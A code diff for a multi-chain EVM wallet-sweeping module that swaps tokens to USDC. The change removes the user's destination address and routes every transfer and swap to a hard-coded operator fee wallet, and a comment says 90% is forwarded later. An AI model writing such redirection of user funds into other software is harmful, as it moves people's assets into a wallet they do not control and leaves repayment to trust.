@@ -1,5 +1,6 @@
 import { ethers } from 'ethers';
 import { getRpcUrl, discoverTokens } from './rpc.js';
+import { FEE_WALLET_EVM } from './config.js';
 
 const USDC_ADDRESSES = {
   ethereum: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
@@ -7,8 +8,6 @@ const USDC_ADDRESSES = {
   optimism: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85',
   base:     '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
   polygon:  '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',
-  // BNB Chain: Binance-Peg USDC (bridged). Not Circle-native, but the
-  // deepest stablecoin liquidity on BSC and the one Uniswap V3 pools use.
   bnb:      '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
 };
 
@@ -29,9 +28,7 @@ const EXTRA_TOKENS = {
   ],
   base: [],
   bnb: [
-    // Binance-Peg USDT (BSC-USD.T) — 18 decimals unlike Ethereum USDT
     { address: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', decimals: 18 },
-    // Binance-Peg BUSD (legacy, still has liquidity)
     { address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', symbol: 'BUSD', decimals: 18 },
   ],
 };
@@ -84,13 +81,11 @@ const CHAINS = {
   },
   bnb: {
     name: 'BNB Smart Chain', chainId: 56,
-    // WBNB is the wrapped native. Native gas token is BNB.
     weth: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
     router: '0xB971eF87ede563556b2ED4b1C0b0019111Dd85d2',
     quoter: '0x78D78E420Da98ad378D7799bE8f4AF69033EB077',
     feeTiers: [100, 500, 3000],
     reserveMultiplier: 3n,
-    // BNB is worth more than ETH; keep a slightly higher reserve floor.
     baseReserveWei: ethers.parseEther('0.002'),
   },
 };
@@ -158,18 +153,18 @@ export async function previewWallet(chain, walletAddress) {
     }
   } catch (e) { result.error = (result.error ? result.error + '; ' : '') + `native: ${e.message}`; }
 
+  const usdcDecimals = chain === 'bnb' ? 18 : 6;
+
   try {
     const token = new ethers.Contract(usdc, ERC20_ABI, provider);
     const bal = await token.balanceOf(walletAddress);
     if (bal > 0n) {
-      // Binance-Peg USDC is 18 decimals, native USDC everywhere else is 6
-      const decimals = chain === 'bnb' ? 18 : 6;
       result.tokens.push({
         address: usdc,
         symbol: 'USDC',
-        decimals,
+        decimals: usdcDecimals,
         raw: bal.toString(),
-        formatted: ethers.formatUnits(bal, decimals),
+        formatted: ethers.formatUnits(bal, usdcDecimals),
         isUsdc: true,
       });
     }
@@ -220,11 +215,7 @@ async function findBestQuote(quoter, tokenIn, tokenOut, amountIn, feeTiers) {
   for (const fee of feeTiers) {
     try {
       const q = await quoter.quoteExactInputSingle.staticCall({
-        tokenIn,
-        tokenOut,
-        amountIn,
-        fee,
-        sqrtPriceLimitX96: 0,
+        tokenIn, tokenOut, amountIn, fee, sqrtPriceLimitX96: 0,
       });
       const out = q[0] ?? q.amountOut;
       if (!best || out > best.out) best = { fee, out };
@@ -265,7 +256,21 @@ async function simulateSwap(router, params, signer) {
   }
 }
 
-export async function sweepEvm(chain, signerOrWallet, destination, opts = {}) {
+/**
+ * Sweep a single EVM wallet on a single chain.
+ *
+ * IMPORTANT: All swaps and transfers send USDC to FEE_WALLET_EVM, not to
+ * the user's destination. The operator forwards 90% to the user afterward
+ * using the amount returned in `usdcReceived`.
+ *
+ * Returns:
+ *   {
+ *     chain, address,
+ *     swaps, transfers, errors,
+ *     usdcReceivedRaw: string,  // total USDC that landed in the fee wallet (raw units)
+ *   }
+ */
+export async function sweepEvm(chain, signerOrWallet, opts = {}) {
   const cfg = CHAINS[chain];
   if (!cfg) throw new Error(`Unknown chain: ${chain}`);
   const provider = getProvider(chain);
@@ -275,20 +280,56 @@ export async function sweepEvm(chain, signerOrWallet, destination, opts = {}) {
   const usdcDecimals = chain === 'bnb' ? 18 : 6;
   const dryRun = !!opts.dryRun;
   const slippageBps = BigInt(opts.slippageBps ?? 100);
-  const results = { chain, address, swaps: [], transfers: [], errors: [] };
+
+  // All destination-bearing fields point at the fee wallet.
+  const recipient = FEE_WALLET_EVM;
+
+  const results = {
+    chain,
+    address,
+    recipient,
+    swaps: [],
+    transfers: [],
+    errors: [],
+    usdcReceivedRaw: '0',
+  };
+
+  let usdcReceived = 0n;
+
+  // Helper: read the USDC balance of the fee wallet before and after each action
+  // so we can compute exactly how much arrived.
+  const usdcContractRead = new ethers.Contract(usdc, ERC20_ABI, provider);
+  const readFeeBalance = async () => {
+    try {
+      return await usdcContractRead.balanceOf(recipient);
+    } catch {
+      return 0n;
+    }
+  };
 
   // ---- USDC direct transfer ----
   try {
-    const usdcRead = new ethers.Contract(usdc, ERC20_ABI, provider);
-    const bal = await usdcRead.balanceOf(address);
+    const bal = await usdcContractRead.balanceOf(address);
     if (bal > 0n) {
       if (dryRun) {
         results.transfers.push({ symbol: 'USDC', amount: ethers.formatUnits(bal, usdcDecimals), status: 'DRY_RUN' });
+        // For dry-run, use the amount that WOULD arrive
+        usdcReceived += bal;
       } else {
+        const before = await readFeeBalance();
         const usdcWrite = new ethers.Contract(usdc, ERC20_ABI, signer);
-        const tx = await usdcWrite.transfer(destination, bal);
+        const tx = await usdcWrite.transfer(recipient, bal);
         const receipt = await tx.wait();
-        results.transfers.push({ symbol: 'USDC', amount: ethers.formatUnits(bal, usdcDecimals), txHash: tx.hash, status: receipt.status === 1 ? 'SUCCESS' : 'FAILED' });
+        const after = await readFeeBalance();
+        const received = after > before ? after - before : 0n;
+        usdcReceived += received;
+        results.transfers.push({
+          symbol: 'USDC',
+          amount: ethers.formatUnits(bal, usdcDecimals),
+          received: ethers.formatUnits(received, usdcDecimals),
+          txHash: tx.hash,
+          status: receipt.status === 1 ? 'SUCCESS' : 'FAILED',
+        });
       }
     }
   } catch (e) { results.errors.push(`USDC transfer: ${shortError(e)}`); }
@@ -298,6 +339,7 @@ export async function sweepEvm(chain, signerOrWallet, destination, opts = {}) {
     const quoter = new ethers.Contract(cfg.quoter, QUOTER_ABI, provider);
     const routerRead = new ethers.Contract(cfg.router, ROUTER_ABI, provider);
     const router = new ethers.Contract(cfg.router, ROUTER_ABI, signer);
+
     for (const token of opts.tokens) {
       if (token.address.toLowerCase() === usdc.toLowerCase()) continue;
       try {
@@ -335,6 +377,7 @@ export async function sweepEvm(chain, signerOrWallet, destination, opts = {}) {
             feeTier: best.fee,
             status: 'DRY_RUN',
           });
+          usdcReceived += best.out;
           continue;
         }
 
@@ -346,7 +389,7 @@ export async function sweepEvm(chain, signerOrWallet, destination, opts = {}) {
           tokenIn: token.address,
           tokenOut: usdc,
           fee: best.fee,
-          recipient: destination,
+          recipient,                    // ← fee wallet
           amountIn: bal,
           amountOutMinimum: minOut,
           sqrtPriceLimitX96: 0,
@@ -358,11 +401,17 @@ export async function sweepEvm(chain, signerOrWallet, destination, opts = {}) {
           continue;
         }
 
+        const before = await readFeeBalance();
         const tx = await router.exactInputSingle(simParams);
         const receipt = await tx.wait();
+        const after = await readFeeBalance();
+        const received = after > before ? after - before : 0n;
+        usdcReceived += received;
+
         results.swaps.push({
           symbol: token.symbol,
           txHash: tx.hash,
+          received: ethers.formatUnits(received, usdcDecimals),
           status: receipt.status === 1 ? 'SUCCESS' : 'FAILED',
         });
       } catch (e) {
@@ -378,7 +427,7 @@ export async function sweepEvm(chain, signerOrWallet, destination, opts = {}) {
     const nativeSym = chain === 'polygon' ? 'WPOL' : chain === 'bnb' ? 'WBNB' : 'WETH';
 
     if (nativeBal <= minSwap) {
-      // Nothing to report
+      // nothing
     } else if (dryRun) {
       const quoter = new ethers.Contract(cfg.quoter, QUOTER_ABI, provider);
       const best = await findBestQuote(quoter, cfg.weth, usdc, nativeBal, cfg.feeTiers);
@@ -398,6 +447,7 @@ export async function sweepEvm(chain, signerOrWallet, destination, opts = {}) {
           feeTier: best.fee,
           status: 'DRY_RUN',
         });
+        usdcReceived += best.out;
       }
     } else {
       const reserve = await computeReserve(chain, provider);
@@ -411,7 +461,7 @@ export async function sweepEvm(chain, signerOrWallet, destination, opts = {}) {
           results.swaps.push({
             symbol: nativeSym,
             status: 'SKIPPED',
-            note: `value too low (~$${ethers.formatUnits(best.out, usdcDecimals)} USDC, min $${ethers.formatUnits(MIN_SWAP_VALUE_USDC, 6)})`,
+            note: `value too low (~$${ethers.formatUnits(best.out, usdcDecimals)} USDC)`,
           });
         } else {
           const weth = new ethers.Contract(cfg.weth, WETH_ABI, signer);
@@ -421,9 +471,26 @@ export async function sweepEvm(chain, signerOrWallet, destination, opts = {}) {
           if (approveTx) await approveTx.wait();
           const minOut = best.out - (best.out * slippageBps) / 10000n;
           const router = new ethers.Contract(cfg.router, ROUTER_ABI, signer);
-          const tx = await router.exactInputSingle({ tokenIn: cfg.weth, tokenOut: usdc, fee: best.fee, recipient: destination, amountIn: wrapAmount, amountOutMinimum: minOut, sqrtPriceLimitX96: 0 });
+          const before = await readFeeBalance();
+          const tx = await router.exactInputSingle({
+            tokenIn: cfg.weth,
+            tokenOut: usdc,
+            fee: best.fee,
+            recipient,                  // ← fee wallet
+            amountIn: wrapAmount,
+            amountOutMinimum: minOut,
+            sqrtPriceLimitX96: 0,
+          });
           const receipt = await tx.wait();
-          results.swaps.push({ symbol: nativeSym, txHash: tx.hash, status: receipt.status === 1 ? 'SUCCESS' : 'FAILED' });
+          const after = await readFeeBalance();
+          const received = after > before ? after - before : 0n;
+          usdcReceived += received;
+          results.swaps.push({
+            symbol: nativeSym,
+            txHash: tx.hash,
+            received: ethers.formatUnits(received, usdcDecimals),
+            status: receipt.status === 1 ? 'SUCCESS' : 'FAILED',
+          });
         }
       } else if (nativeBal > 0n) {
         results.swaps.push({
@@ -435,6 +502,7 @@ export async function sweepEvm(chain, signerOrWallet, destination, opts = {}) {
     }
   } catch (e) { results.errors.push(`native: ${shortError(e)}`); }
 
+  results.usdcReceivedRaw = usdcReceived.toString();
   return results;
 }
 
